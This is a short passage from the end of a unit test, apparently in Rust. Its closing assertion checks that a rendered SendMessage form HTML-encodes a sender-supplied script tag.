            "Rendered SendMessage form must contain HTML-encoded sender payload",
            rendered.contains("&lt;script&gt;")
        );
    }
}
